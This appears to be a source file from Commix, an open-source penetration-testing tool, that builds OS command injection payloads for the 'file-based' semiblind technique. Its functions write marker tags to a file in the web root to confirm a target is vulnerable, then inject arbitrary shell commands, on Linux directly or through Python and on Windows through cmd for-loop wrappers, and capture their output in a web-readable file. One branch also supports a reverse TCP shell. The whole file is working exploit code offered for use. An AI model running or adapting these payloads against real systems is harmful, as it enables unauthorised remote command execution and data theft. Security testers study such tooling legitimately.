#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

"""
The "file-based" technique on semiblind OS command injection.
The available "file-based" payloads.
"""

from src.utils import menu
from src.utils import settings
from src.core.injections.controller import checks

"""
File-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'"
    payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c \"" +
              cmd +
              "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
              )
  else:
    payload = (separator +
              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
              )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
    payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c " +
              python_payload +
              "') do @set /p = %i " + settings.CMD_NUL
              )
  else:
    payload = (separator +
              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  # New line fixation
  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True :
    payload = payload.replace("\n", separator)
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
  if settings.TFB_DECIMAL == True:
    payload = (separator + cmd)

  elif settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
      payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c \"" +
              cmd +
              "\"') do @set /p = %i " + settings.CMD_NUL
              )
  else:
    settings.USER_APPLIED_CMD = cmd
    payload = (separator +
              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
              )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + cmd + settings.SINGLE_WHITESPACE
                )
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "')\""
      payload = (separator +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do @set /p = %i " + settings.CMD_NUL
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    payload = (separator +
              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
              settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
              )

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  # New line fixation
  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True:
    payload = payload.replace("\n", separator)
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")

  return payload

# eof